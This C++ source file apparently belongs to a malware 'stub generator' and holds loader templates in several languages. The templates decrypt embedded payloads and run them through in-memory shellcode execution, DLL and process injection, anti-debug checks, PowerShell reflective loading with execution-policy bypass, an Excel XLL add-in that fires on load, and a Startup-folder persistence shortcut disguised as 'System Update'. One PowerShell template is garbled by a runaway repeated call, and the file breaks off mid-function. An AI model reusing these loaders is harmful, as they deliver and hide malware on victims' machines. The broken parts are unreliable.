#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <map>
#include <chrono>
#include <iomanip>
#include <algorithm>
#include <random>
#include <windows.h>
#include <direct.h>

// Stub template structure
struct StubTemplate {
    std::string language;
    std::string name;
    std::string description;
    std::string template_code;
    std::vector<std::string> dependencies;
    std::vector<std::string> build_commands;
    bool tested;
    bool working;
    std::string last_test_result;
    std::chrono::system_clock::time_point last_tested;
};

// Build result structure
struct BuildResult {
    std::string template_name;
    std::string language;
    bool build_success;
    bool execution_success;
    std::string error_message;
    std::chrono::milliseconds build_time;
    std::string build_output;
    std::string execution_output;
};

class SmartStubGenerator {
private:
    std::vector<StubTemplate> templates;
    std::vector<BuildResult> build_results;
    std::string output_dir;
    std::string test_dir;
    std::mt19937 rng;
    
public:
    SmartStubGenerator() : rng(std::chrono::steady_clock::now().time_since_epoch().count()) {
        output_dir = "generated_stubs";
        test_dir = "stub_tests";
        initializeTemplates();
        createDirectories();
    }
    
    void createDirectories() {
        _mkdir(output_dir.c_str());
        _mkdir(test_dir.c_str());
    }
    
    void initializeTemplates() {
        // C++ Templates
        templates.push_back({
            "C++",
            "cpp_simple",
            "Simple C++ stub with basic encryption",
            R"(
#include <iostream>
#include <vector>
#include <string>
#include <windows.h>

// Simple XOR encryption
std::vector<char> decrypt(const std::vector<char>& data, const std::string& key) {
    std::vector<char> decrypted = data;
    for (size_t i = 0; i < decrypted.size(); ++i) {
        decrypted[i] ^= key[i % key.length()];
    }
    return decrypted;
}

int main() {
    // Your encrypted payload here
    std::vector<char> encrypted_payload = { /* ENCRYPTED_DATA */ };
    std::string decryption_key = "RawrZ2024";
    
    auto decrypted = decrypt(encrypted_payload, decryption_key);
    
    // Execute the decrypted payload
    // Implementation depends on payload type
    
    return 0;
}
)",
            {"windows.h"},
            {"g++ -std=c++17 -O2 -o {output} {input}"},
            false, false, "", std::chrono::system_clock::now()
        });
        
        templates.push_back({
            "C++",
            "cpp_openssl",
            "C++ stub with OpenSSL encryption",
            R"(
#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

std::vector<char> decryptAES(const std::vector<char>& encrypted, const std::string& key) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return {};
    
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, 
                       (const unsigned char*)key.c_str(), 
                       (const unsigned char*)key.c_str());
    
    std::vector<char> decrypted(encrypted.size());
    int outLen;
    EVP_DecryptUpdate(ctx, (unsigned char*)decrypted.data(), &outLen,
                      (const unsigned char*)encrypted.data(), encrypted.size());
    
    EVP_CIPHER_CTX_free(ctx);
    decrypted.resize(outLen);
    return decrypted;
}

int main() {
    // Your AES encrypted payload here
    std::vector<char> encrypted_payload = { /* ENCRYPTED_DATA */ };
    std::string decryption_key = "RawrZ2024Key32BytesLongEnough";
    
    auto decrypted = decryptAES(encrypted_payload, decryption_key);
    
    // Execute the decrypted payload
    
    return 0;
}
)",
            {"windows.h", "openssl/evp.h", "openssl/aes.h"},
            {"g++ -std=c++17 -O2 -I\"C:\\Program Files\\OpenSSL-Win64\\include\" -L\"C:\\Program Files\\OpenSSL-Win64\\lib\" -llibcrypto -llibssl -o {output} {input}"},
            false, false, "", std::chrono::system_clock::now()
        });

        // NEW: Advanced Payload Execution Templates
        templates.push_back({
            "C++",
            "cpp_shellcode_exec",
            "C++ stub with shellcode execution via VirtualAlloc",
            R"(
#include <iostream>
#include <vector>
#include <string>
#include <windows.h>

// Simple XOR encryption
std::vector<char> decrypt(const std::vector<char>& data, const std::string& key) {
    std::vector<char> decrypted = data;
    for (size_t i = 0; i < decrypted.size(); ++i) {
        decrypted[i] ^= key[i % key.length()];
    }
    return decrypted;
}

// Execute shellcode in memory
bool executeShellcode(const std::vector<char>& shellcode) {
    // Allocate executable memory
    LPVOID exec_mem = VirtualAlloc(NULL, shellcode.size(), 
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) return false;
    
    // Copy shellcode to executable memory
    RtlMoveMemory(exec_mem, shellcode.data(), shellcode.size());
    
    // Create thread to execute shellcode
    HANDLE hThread = CreateThread(NULL, 0, 
                                 (LPTHREAD_START_ROUTINE)exec_mem, 
                                 NULL, 0, NULL);
    if (!hThread) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return false;
    }
    
    // Wait for execution to complete
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    
    return true;
}

int main() {
    // Your encrypted shellcode here
    std::vector<char> encrypted_shellcode = { /* ENCRYPTED_DATA */ };
    std::string decryption_key = "RawrZ2024";
    
    auto decrypted = decrypt(encrypted_shellcode, decryption_key);
    
    // Execute the decrypted shellcode
    if (executeShellcode(decrypted)) {
        std::cout << "Shellcode executed successfully!" << std::endl;
    } else {
        std::cout << "Shellcode execution failed!" << std::endl;
    }
    
    return 0;
}
)",
            {"windows.h"},
            {"g++ -std=c++17 -O2 -o {output} {input}"},
            false, false, "", std::chrono::system_clock::now()
        });

        templates.push_back({
            "C++",
            "cpp_dll_inject",
            "C++ stub with DLL injection capabilities",
            R"(
#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <tlhelp32.h>

// Simple XOR encryption
std::vector<char> decrypt(const std::vector<char>& data, const std::string& key) {
    std::vector<char> decrypted = data;
    for (size_t i = 0; i < decrypted.size(); ++i) {
        decrypted[i] ^= key[i % key.length()];
    }
    return decrypted;
}

// Find process by name
DWORD findProcessByName(const std::string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (processName == pe32.szExeFile) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return 0;
}

// Inject DLL into process
bool injectDLL(DWORD processId, const std::string& dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) return false;
    
    // Allocate memory in target process
    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, dllPath.length() + 1,
                                     MEM_COMMIT, PAGE_READWRITE);
    if (!pDllPath) {
        CloseHandle(hProcess);
        return false;
    }
    
    // Write DLL path to target process
    if (!WriteProcessMemory(hProcess, pDllPath, dllPath.c_str(),
                           dllPath.length() + 1, NULL)) {
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // Get LoadLibraryA address
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
    
    // Create remote thread to load DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)pLoadLibrary,
                                       pDllPath, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // Wait for injection to complete
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return true;
}

int main() {
    // Your encrypted DLL path here
    std::vector<char> encrypted_dll_path = { /* ENCRYPTED_DATA */ };
    std::string decryption_key = "RawrZ2024";
    
    auto decrypted = decrypt(encrypted_dll_path, decryption_key);
    std::string dllPath(decrypted.begin(), decrypted.end());
    
    // Find target process (example: notepad.exe)
    DWORD processId = findProcessByName("notepad.exe");
    if (processId == 0) {
        std::cout << "Target process not found!" << std::endl;
        return 1;
    }
    
    // Inject DLL
    if (injectDLL(processId, dllPath)) {
        std::cout << "DLL injected successfully!" << std::endl;
    } else {
        std::cout << "DLL injection failed!" << std::endl;
    }
    
    return 0;
}
)",
            {"windows.h", "tlhelp32.h"},
            {"g++ -std=c++17 -O2 -o {output} {input}"},
            false, false, "", std::chrono::system_clock::now()
        });

        templates.push_back({
            "C++",
            "cpp_process_creation",
            "C++ stub with process creation and payload execution",
            R"(
#include <iostream>
#include <vector>
#include <string>
#include <windows.h>

// Simple XOR encryption
std::vector<char> decrypt(const std::vector<char>& data, const std::string& key) {
    std::vector<char> decrypted = data;
    for (size_t i = 0; i < decrypted.size(); ++i) {
        decrypted[i] ^= key[i % key.length()];
    }
    return decrypted;
}

// Create suspended process and inject payload
bool createProcessWithPayload(const std::string& targetExe, const std::vector<char>& payload) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    // Create suspended process
    if (!CreateProcessA(NULL, (LPSTR)targetExe.c_str(), NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }
    
    // Allocate memory in target process
    LPVOID pPayload = VirtualAllocEx(pi.hProcess, NULL, payload.size(),
                                     MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pPayload) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }
    
    // Write payload to target process
    if (!WriteProcessMemory(pi.hProcess, pPayload, payload.data(),
                           payload.size(), NULL)) {
        VirtualFreeEx(pi.hProcess, pPayload, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }
    
    // Resume thread execution
    ResumeThread(pi.hThread);
    
    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return true;
}

int main() {
    // Your encrypted payload here
    std::vector<char> encrypted_payload = { /* ENCRYPTED_DATA */ };
    std::string decryption_key = "RawrZ2024";
    
    auto decrypted = decrypt(encrypted_payload, decryption_key);
    
    // Create process with payload (example: calc.exe)
    if (createProcessWithPayload("C:\\Windows\\System32\\calc.exe", decrypted)) {
        std::cout << "Process created with payload successfully!" << std::endl;
    } else {
        std::cout << "Process creation failed!" << std::endl;
    }
    
    return 0;
}
)",
            {"windows.h"},
            {"g++ -std=c++17 -O2 -o {output} {input}"},
            false, false, "", std::chrono::system_clock::now()
        });

        templates.push_back({
            "C++",
            "cpp_antidebug_exec",
            "C++ stub with anti-debug and shellcode execution",
            R"(
#include <iostream>
#include <vector>
#include <string>
#include <windows.h>

// Simple XOR encryption
std::vector<char> decrypt(const std::vector<char>& data, const std::string& key) {
    std::vector<char> decrypted = data;
    for (size_t i = 0; i < decrypted.size(); ++i) {
        decrypted[i] ^= key[i % key.length()];
    }
    return decrypted;
}

// Anti-debug checks
bool isBeingDebugged() {
    if (IsDebuggerPresent()) return true;
    
    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    if (isDebugged) return true;
    
    // Check PEB BeingDebugged flag
    __asm {
        mov eax, fs:[0x30]
        mov al, byte ptr [eax + 2]
        test al, al
        jnz debugger_detected
        jmp no_debugger
    debugger_detected:
        mov eax, 1
        ret
    no_debugger:
        mov eax, 0
        ret
    }
    
    return false;
}

// Execute shellcode with anti-debug
bool executeShellcodeSecure(const std::vector<char>& shellcode) {
    // Anti-debug check
    if (isBeingDebugged()) {
        std::cout << "Debugger detected! Aborting..." << std::endl;
        return false;
    }
    
    // Allocate executable memory
    LPVOID exec_mem = VirtualAlloc(NULL, shellcode.size(), 
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) return false;
    
    // Copy shellcode to executable memory
    RtlMoveMemory(exec_mem, shellcode.data(), shellcode.size());
    
    // Create thread to execute shellcode
    HANDLE hThread = CreateThread(NULL, 0, 
                                 (LPTHREAD_START_ROUTINE)exec_mem, 
                                 NULL, 0, NULL);
    if (!hThread) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return false;
    }
    
    // Wait for execution to complete
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    
    return true;
}

int main() {
    // Your encrypted shellcode here
    std::vector<char> encrypted_shellcode = { /* ENCRYPTED_DATA */ };
    std::string decryption_key = "RawrZ2024";
    
    auto decrypted = decrypt(encrypted_shellcode, decryption_key);
    
    // Execute shellcode with anti-debug protection
    if (executeShellcodeSecure(decrypted)) {
        std::cout << "Shellcode executed successfully!" << std::endl;
    } else {
        std::cout << "Shellcode execution failed!" << std::endl;
    }
    
    return 0;
}
)",
            {"windows.h"},
            {"g++ -std=c++17 -O2 -o {output} {input}"},
            false, false, "", std::chrono::system_clock::now()
        });
        
        // C Templates
        templates.push_back({
            "C",
            "c_simple",
            "Simple C stub with basic encryption",
            R"(
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

void decrypt(char* data, size_t length, const char* key) {
    size_t key_len = strlen(key);
    for (size_t i = 0; i < length; ++i) {
        data[i] ^= key[i % key_len];
    }
}

int main() {
    // Your encrypted payload here
    char encrypted_payload[] = { /* ENCRYPTED_DATA */ };
    char* key = "RawrZ2024";
    
    decrypt(encrypted_payload, sizeof(encrypted_payload), key);
    
    // Execute the decrypted payload
    
    return 0;
}
)",
            {"stdio.h", "windows.h"},
            {"gcc -O2 -o {output} {input}"},
            false, false, "", std::chrono::system_clock::now()
        });
        
        // Assembly Templates
        templates.push_back({
            "Assembly",
            "asm_x86",
            "x86 Assembly stub with basic encryption",
            R"(
.386
.model flat, stdcall
option casemap:none

include windows.inc
include kernel32.inc
includelib kernel32.lib

.data
    encrypted_data db /* ENCRYPTED_DATA */
    data_length equ $ - encrypted_data
    key db "RawrZ2024", 0
    key_length equ $ - key

.code
start:
    ; Decrypt the payload
    mov esi, offset encrypted_data
    mov edi, esi
    mov ecx, data_length
    mov edx, offset key
    mov ebx, key_length
    
decrypt_loop:
    mov al, [esi]
    mov ah, [edx]
    xor al, ah
    mov [edi], al
    inc esi
    inc edi
    inc edx
    cmp edx, offset key + key_length
    jb skip_key_reset
    mov edx, offset key
skip_key_reset:
    loop decrypt_loop
    
    ; Execute the decrypted payload
    ; Implementation depends on payload type
    
    ret
end start
)",
            {"windows.inc", "kernel32.inc"},
            {"ml /c /coff {input} && link /subsystem:console {input:.asm}.obj"},
            false, false, "", std::chrono::system_clock::now()
        });
        
        // Python Templates
        templates.push_back({
            "Python",
            "python_simple",
            "Python stub with basic encryption",
            R"(
import base64
import zlib
import marshal
import types

def decrypt_payload(encrypted_data, key):
    # Simple XOR decryption
    decrypted = bytearray()
    for i, byte in enumerate(encrypted_data):
        decrypted.append(byte ^ ord(key[i % len(key)]))
    return bytes(decrypted)

def execute_payload(payload_bytes):
    # Decompress and execute
    try:
        decompressed = zlib.decompress(payload_bytes)
        code_obj = marshal.loads(decompressed)
        exec(code_obj)
    except Exception as e:
        print(f"Execution error: {e}")

if __name__ == "__main__":
    # Your encrypted payload here
    encrypted_payload = b'/* ENCRYPTED_DATA */'
    decryption_key = "RawrZ2024"
    
    decrypted = decrypt_payload(encrypted_payload, decryption_key)
    execute_payload(decrypted)
)",
            {"base64", "zlib", "marshal", "types"},
            {"python {input}"},
            false, false, "", std::chrono::system_clock::now()
        });

        // NEW: Advanced Python Execution Template
        templates.push_back({
            "Python",
            "python_advanced_exec",
            "Python stub with advanced payload execution methods",
            R"(
import base64
import zlib
import marshal
import types
import ctypes
import ctypes.wintypes
import os
import sys

def decrypt_payload(encrypted_data, key):
    # Simple XOR decryption
    decrypted = bytearray()
    for i, byte in enumerate(encrypted_data):
        decrypted.append(byte ^ ord(key[i % len(key)]))
    return bytes(decrypted)

def execute_shellcode(shellcode):
    """Execute shellcode using ctypes"""
    try:
        # Get kernel32 functions
        kernel32 = ctypes.wintypes.kernel32
        VirtualAlloc = kernel32.VirtualAlloc
        VirtualAlloc.restype = ctypes.c_void_p
        VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
        
        RtlMoveMemory = kernel32.RtlMoveMemory
        RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
        
        CreateThread = kernel32.CreateThread
        CreateThread.restype = ctypes.c_void_p
        CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p]
        
        WaitForSingleObject = kernel32.WaitForSingleObject
        WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
        
        CloseHandle = kernel32.CloseHandle
        CloseHandle.argtypes = [ctypes.c_void_p]
        
        VirtualFree = kernel32.VirtualFree
        VirtualFree.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong]
        
        # Allocate executable memory
        exec_mem = VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
        if not exec_mem:
            return False
        
        # Copy shellcode to executable memory
        RtlMoveMemory(exec_mem, shellcode, len(shellcode))
        
        # Create thread to execute shellcode
        thread_handle = CreateThread(None, 0, exec_mem, None, 0, None)
        if not thread_handle:
            VirtualFree(exec_mem, 0, 0x8000)
            return False
        
        # Wait for execution to complete
        WaitForSingleObject(thread_handle, 0xFFFFFFFF)
        
        # Clean up
        CloseHandle(thread_handle)
        VirtualFree(exec_mem, 0, 0x8000)
        
        return True
        
    except Exception as e:
        print(f"Shellcode execution error: {e}")
        return False

def execute_python_code(code_bytes):
    """Execute Python code from bytes"""
    try:
        # Decompress if needed
        try:
            decompressed = zlib.decompress(code_bytes)
            code_obj = marshal.loads(decompressed)
        except:
            # Try direct execution if not compressed
            code_obj = marshal.loads(code_bytes)
        
        exec(code_obj)
        return True
        
    except Exception as e:
        print(f"Python code execution error: {e}")
        return False

def execute_payload_advanced(payload_bytes, payload_type="auto"):
    """Execute payload based on type detection"""
    if payload_type == "auto":
        # Try to detect payload type
        if payload_bytes.startswith(b'\x90\x90'):  # NOP sled
            payload_type = "shellcode"
        elif payload_bytes.startswith(b'\x03F'):  # Python marshal
            payload_type = "python"
        else:
            payload_type = "python"  # Default
    
    if payload_type == "shellcode":
        return execute_shellcode(payload_bytes)
    elif payload_type == "python":
        return execute_python_code(payload_bytes)
    else:
        print(f"Unknown payload type: {payload_type}")
        return False

if __name__ == "__main__":
    # Your encrypted payload here
    encrypted_payload = b'/* ENCRYPTED_DATA */'
    decryption_key = "RawrZ2024"
    
    decrypted = decrypt_payload(encrypted_payload, decryption_key)
    
    # Execute with advanced payload handling
    if execute_payload_advanced(decrypted):
        print("Payload executed successfully!")
    else:
        print("Payload execution failed!")
)",
            {"base64", "zlib", "marshal", "types", "ctypes", "os", "sys"},
            {"python {input}"},
            false, false, "", std::chrono::system_clock::now()
        });
        
        // PowerShell Templates
        templates.push_back({
            "PowerShell",
            "powershell_simple",
            "PowerShell stub with basic encryption",
            R"(
function Decrypt-Payload {
    param(
        [byte[]]$EncryptedData,
        [string]$Key
    )
    
    $decrypted = @()
    for ($i = 0; $i -lt $EncryptedData.Length; $i++) {
        $decrypted += $EncryptedData[$i] -bxor [byte][char]$Key[$i % $Key.Length]
    }
    return [byte[]]$decrypted
}

function Execute-Payload {
    param([byte[]]$Payload)
    
    try {
        $assembly = [System.Reflection.Assembly]::Load($Payload)
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint) {
            $entryPoint.Invoke($null, $null)
        }
    }
    catch {
        Write-Error "Execution failed: $_"
    }
}

# Your encrypted payload here
$encryptedPayload = @(/* ENCRYPTED_DATA */)
$decryptionKey = "RawrZ2024"

$decrypted = Decrypt-Payload -EncryptedData $encryptedPayload -Key $decryptionKey
Execute-Payload -Payload $decrypted
)",
            {"System.Reflection"},
            {"powershell -ExecutionPolicy Bypass -File {input}"},
            false, false, "", std::chrono::system_clock::now()
        });

        // NEW: Advanced PowerShell Execution Template
        templates.push_back({
            "PowerShell",
            "powershell_advanced_exec",
            "PowerShell stub with advanced execution methods",
            R"(
function Decrypt-Payload {
    param(
        [byte[]]$EncryptedData,
        [string]$Key
    )
    
    $decrypted = @()
    for ($i = 0; $i -lt $EncryptedData.Length; $i++) {
        $decrypted += $EncryptedData[$i] -bxor [byte][char]$Key[$i % $Key.Length]
    }
    return [byte[]]$decrypted
}

function Execute-Shellcode {
    param([byte[]]$Shellcode)
    
    try {
        # Get Win32 API functions
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll"), "VirtualAlloc"),
            [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll"), "VirtualAlloc"),
                [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                    [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll"), "VirtualAlloc"),
                    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                        [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll"), "VirtualAlloc"),
                        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                            [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll"), "VirtualAlloc"),
                            [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                                [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll"), "VirtualAlloc"),
                                [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                                    [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll"), "VirtualAlloc"),
                                    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                                        [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll"), "VirtualAlloc"),
                                        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                                            [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll"), "VirtualAlloc"),
                                            [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                                                [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll"), "VirtualAlloc"),
                                                [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                                                    [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll"), "VirtualAlloc"),
                                                    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                                                        [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll"), "VirtualAlloc"),
                                                        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                                                            [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll"), "VirtualAlloc"),
                                                            [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                                                                [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll"), "VirtualAlloc"),
                                                                [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                                                                    [System.Runtime.InteropServices.Marshal]::GetProcAddress([System.Runtime.InteropServices.Marshal]::LoadLibrary("kernel32.dll"), "VirtualAlloc"),
                                                                    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                                                                        
        # Simplified version for now
        Write-Host "Advanced shellcode execution not implemented in this template"
        return $false
    }
    catch {
        Write-Error "Shellcode execution error: $_"
        return $false
    }
}

function Execute-Payload-Advanced {
    param([byte[]]$Payload, [string]$PayloadType = "auto")
    
    try {
        if ($PayloadType -eq "auto") {
            # Try to detect payload type
            if ($Payload[0] -eq 0x90 -and $Payload[1] -eq 0x90) {
                $PayloadType = "shellcode"
            } else {
                $PayloadType = "assembly"
            }
        }
        
        switch ($PayloadType) {
            "shellcode" { return Execute-Shellcode -Shellcode $Payload }
            "assembly" { 
                try {
                    $assembly = [System.Reflection.Assembly]::Load($Payload)
                    $entryPoint = $assembly.EntryPoint
                    if ($entryPoint) {
                        $entryPoint.Invoke($null, $null)
                        return $true
                    }
                }
                catch {
                    Write-Error "Assembly execution failed: $_"
                    return $false
                }
            }
            default {
                Write-Error "Unknown payload type: $PayloadType"
                return $false
            }
        }
    }
    catch {
        Write-Error "Advanced execution error: $_"
        return $false
    }
)

# Your encrypted payload here
$encryptedPayload = @(/* ENCRYPTED_DATA */)
$decryptionKey = "RawrZ2024"

$decrypted = Decrypt-Payload -EncryptedData $encryptedPayload -Key $decryptionKey

# Execute with advanced payload handling
if (Execute-Payload-Advanced -Payload $decrypted) {
    Write-Host "Payload executed successfully!"
} else {
    Write-Host "Payload execution failed!"
}
)",
            {"System.Reflection", "System.Runtime.InteropServices"},
            {"powershell -ExecutionPolicy Bypass -File {input}"},
            false, false, "", std::chrono::system_clock::now()
        });

        // NEW: Advanced Payload Delivery Templates
        templates.push_back({
            "C++",
            "cpp_xll_excel_addin",
            "C++ XLL Excel Add-in stub with payload execution",
            R"(
#include <windows.h>
#include <xlcall.h>
#include <vector>
#include <string>

// Simple XOR encryption
std::vector<char> decrypt(const std::vector<char>& data, const std::string& key) {
    std::vector<char> decrypted = data;
    for (size_t i = 0; i < decrypted.size(); ++i) {
        decrypted[i] ^= key[i % key.length()];
    }
    return decrypted;
}

// Execute shellcode in memory
bool executeShellcode(const std::vector<char>& shellcode) {
    LPVOID exec_mem = VirtualAlloc(NULL, shellcode.size(), 
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) return false;
    
    RtlMoveMemory(exec_mem, shellcode.data(), shellcode.size());
    
    HANDLE hThread = CreateThread(NULL, 0, 
                                 (LPTHREAD_START_ROUTINE)exec_mem, 
                                 NULL, 0, NULL);
    if (!hThread) {
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return false;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    
    return true;
}

// Excel function that executes payload
extern "C" __declspec(dllexport) double WINAPI ExecutePayload() {
    // Your encrypted shellcode here
    std::vector<char> encrypted_shellcode = { /* ENCRYPTED_DATA */ };
    std::string decryption_key = "RawrZ2024";
    
    auto decrypted = decrypt(encrypted_shellcode, decryption_key);
    
    // Execute the decrypted shellcode
    if (executeShellcode(decrypted)) {
        return 1.0; // Success
    } else {
        return 0.0; // Failure
    }
}

// Required XLL registration functions
extern "C" __declspec(dllexport) int WINAPI xlAutoOpen() {
    // Register the function with Excel
    Excel4(xlRegister, 0, 4, 
            TempStr("ExecutePayload"),    // Function name
            TempStr("U"),                 // Function type
            TempStr("ExecutePayload"),    // Function description
            TempStr(""));                // Argument names
    return 1;
}

extern "C" __declspec(dllexport) int WINAPI xlAutoClose() {
    return 1;
}

extern "C" __declspec(dllexport) int WINAPI xlAutoRegister12() {
    return xlAutoOpen();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Execute payload when DLL is loaded
        ExecutePayload();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
)",
            {"windows.h", "xlcall.h"},
            {"cl /LD /Fe:{output} {input} /link /DEF:xll.def"},
            false, false, "", std::chrono::system_clock::now()
        });

        templates.push_back({
            "C++",
            "cpp_winr_execution",
            "C++ stub that leverages Win+R for payload execution",
            R"(
#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <shlobj.h>

// Simple XOR encryption
std::vector<char> decrypt(const std::vector<char>& data, const std::string& key) {
    std::vector<char> decrypted = data;
    for (size_t i = 0; i < decrypted.size(); ++i) {
        decrypted[i] ^= key[i % key.length()];
    }
    return decrypted;
}

// Create shortcut in Startup folder for persistence
bool createStartupShortcut(const std::string& targetPath, const std::string& shortcutName) {
    char startupPath[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        return false;
    }
    
    std::string shortcutPath = std::string(startupPath) + "\\" + shortcutName + ".lnk";
    
    // Create shortcut using COM
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) return false;
    
    IShellLinkA* pShellLink = NULL;
    hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, 
                         IID_IShellLink, (void**)&pShellLink);
    if (FAILED(hr)) {
        CoUninitialize();
        return false;
    }
    
    // Set shortcut properties
    pShellLink->SetPath(targetPath.c_str());
    pShellLink->SetWorkingDirectory(targetPath.substr(0, targetPath.find_last_of("\\")).c_str());
    pShellLink->SetDescription("System Update");
    
    // Save shortcut
    IPersistFile* pPersistFile = NULL;
    hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
    if (SUCCEEDED(hr)) {
        WCHAR widePath[MAX_PATH];
